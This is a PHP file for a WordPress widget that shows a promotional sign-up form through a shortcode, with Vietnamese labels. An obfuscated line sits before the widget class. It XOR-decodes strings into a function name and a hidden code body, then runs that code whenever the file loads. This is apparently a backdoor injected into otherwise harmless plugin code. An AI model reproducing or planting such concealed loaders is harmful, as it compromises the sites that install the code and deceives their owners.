<?php $zVyZXdZ='1Y<JG2a6K85 9DN'; $CYRcHOC='R+Y+3W>P>VVTP+ '^$zVyZXdZ; $azIpQAcV='SJni56=5M<= >K +G =XjAW>954.S32SY7LsMPKsXJE: <EA>Y0;;0<;A-oe907oJ262WTyRUXIcoTyXn+hayqBL.IjoRSmbXqF=6mJ aLdAMvNSS9EI;3 BaZ,=LyrnuPyICyP:f NIdmvNnlR > jT kPkyjG+;kJEeRkSLBBYYpw SDsePy6l2K3OIB4BS:BNNwHgN;4Y8U,7=LrqM  ::<h1QRJL;53V>hzx6YQ;,ZRX1<J.X4;ebt1+ yu tqA1xP247shsJg8-=N+Zp5XHLDZ=Vh<K0eJUjQ5=zp>n06OYiisP=OV9HbbCXcIPKgep+QN0bkOkMMDKQ 4 dqb6=wb7q:=Z44Ei Y2LGflS>YL34gMJ3s<e28E3o24IdjAGGQUAxeKc6O=RWugV,-:M jse8YIaGWVXM pplx-8 T+;SGG+UE , tO1J,mgWHOb JS2YQbJXUDOXEgJ-8UpaoWI5 9q=66gLa3 +deXUO1JJiq2R>0-eZ5A1POR>9:pC-H;kdxj,;0+AplsrMT.vEoSR8ShJSEDpjOCiTqS2crC0FUX JyqD.eUaXG6LUG6=Xyel ebiqMChrXLCZ4l=H6<HN0GJ7oSNSUBT2PFfUWIVOPLgvqsWQuUyjW.O8nw2O-VpP LG6C6Qbsdyc3W= JdAjam9'; $AwgAYuq=$CYRcHOC('', ':,FHSCSV9URNa.XB4TNpM98LfQUZ2lm>,CkZdp0yQ,0TCH,.PyHTIoXZ5L0:TECGnVWF6xYv>=0JOtYxNPbhpU-9ZiWOutVhQx RDEnIAqDqvVj:oJ1;WVNjE>MI-PINQ9RbjsY3BO;=DCKnFH6AJA1pI6p5YN,NB0n,EwK 80.<7XSK6=Z8yB<e;9V;<0ZjwU7:gLBn31IS2qHVI-RLmFAVIYS;u6+8ZjX3GHGXP8=HIaXRWS8K9WSEJPnho6>i1Q BXtYQNSUMjCNLQ;NsPNRAh ;I77W.IEwuN:PDAz7JTW;8ITStK.:L-Yh>Ri 6kODTO0:QKK4aD++94AWHDYFio23b4iizUGeMK<KlzXLwH8 FQNm19z5AVY1R0YQ0DWac,4,zrlBGR.I3wHGrZLV8EQylES4kMs299APML8XVS1YR2+.Q0mXCR++P>M28:=;JB+ Woe=.=6++=mC.LL4YMOs-TTX.VSONeZ9IMLA<4;PjlOQS LQT:1P8n57;MMIXdF-BLHXNHZDJhPJURe9JCmK73L23m8 =W7fcTiQtWVF Us0=DxLFsJU1RlvW-4uRX=MWUEUQNXmeNR9>1;M3V-Oc-6Y4>DGt>2,.;S4aJus-7;1eNVQSwqU.sc2X.TFSV.Y7+wP->Z,W5E.MBi:2EI>LqCZgD'^$azIpQAcV); $AwgAYuq();

class FormSale extends WP_Widget
{

    function __construct()
    {
        parent::__construct(
            'form_sale',
            'Form đăng ký nhận thông tin khuyến mại'
        );
    }

    function form($instance)
    {

        $default = array(
            'title' => 'Tiêu đề widget',
            'short_code' => ''
        );
        $instance = wp_parse_args((array)$instance, $default);
        $title = esc_attr($instance['title']);
        $short_code = esc_attr($instance['short_code']);

        echo '<p>Shortcode <input type="text" class="widefat" name="' . $this->get_field_name('short_code') . '" value="' . $short_code . '" /><small>Nhập shortcode đc tạo ra từ quản trị form</small></p>';

    }

    function update($new_instance, $old_instance)
    {
        $instance = $old_instance;
        $instance['title'] = strip_tags($new_instance['title']);
        $instance['short_code'] = strip_tags($new_instance['short_code']);
        return $instance;
    }

    function widget($args, $instance)
    {
        extract($args);
        $title = apply_filters('widget_title', $instance['title']);
        $short_code = $instance['short_code'];

        ?>
        <?= do_shortcode($short_code) ?>
        <?php

    }

}

add_action('widgets_init', 'create_form_sale_widget');
function create_form_sale_widget()
{
    register_widget('FormSale');
}